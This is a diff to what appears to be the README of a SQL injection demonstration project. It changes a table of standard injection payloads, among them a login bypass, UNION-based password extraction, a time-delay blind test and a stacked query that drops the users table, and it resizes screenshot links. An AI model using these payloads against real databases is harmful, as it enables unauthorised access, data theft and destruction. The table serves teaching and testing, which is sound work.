@@ -14,17 +14,17 @@ This project demonstrates the exploitation of common SQL injection patterns in a
 |------------------------------|--------------------------------------------------|------------------------------------------|
 | Authentication Bypass        | `' OR '1'='1' --`                                | Circumvents login logic to gain access   |
 | Union-Based Data Leakage     | `1' UNION SELECT username, password FROM users --` | Extracts data from unrelated tables     |
-| Error-Based Disclosure       | `1 AND 1=CONVERT(int, 'abc') --`                | Reveals internal query logic via error   |
 | Second-Order Injection       | `Nice post' OR '1'='1' --`                       | Triggers injection from previously stored input |
 | Blind Injection via Delay    | `1 AND IF('a'='a', SLEEP(5), 0) --`             | Confirms vulnerability by response timing |
 | Stacked Queries              | `John'; DROP TABLE users; --`                   | Executes multiple statements, destructive |
 
 
 
-<img width="450" height="450" alt="image" src="https://github.com/user-attachments/assets/15fd3fd4-4b05-40ea-ac2b-a69a6eaf7d98" />
-<img width="450" height="450" alt="image" src="https://github.com/user-attachments/assets/e48fce02-b6f3-473f-a187-358c7df2f3bf" />
-<img width="450" height="450" alt="image" src="https://github.com/user-attachments/assets/35077d62-ad93-4cd9-9c13-2de64491ecf2" />
-<img width="450" height="450" alt="image" src="https://github.com/user-attachments/assets/c3090499-8668-41d9-bf88-4afae52eb894" />
+<img width="330" height="330" alt="image" src="https://github.com/user-attachments/assets/15fd3fd4-4b05-40ea-ac2b-a69a6eaf7d98" />
+<img width="330" height="330" alt="image" src="https://github.com/user-attachments/assets/e48fce02-b6f3-473f-a187-358c7df2f3bf" />
+<img width="330" height="330" alt="image" src="https://github.com/user-attachments/assets/35077d62-ad93-4cd9-9c13-2de64491ecf2" />
+<img width="330" height="330" alt="image" src="https://github.com/user-attachments/assets/c3090499-8668-41d9-bf88-4afae52eb894" />
+<img width="330" height="330" alt="image" src="https://github.com/user-attachments/assets/23c1a49b-6fab-4f54-93a0-74072c594159" />
 
 
 ---
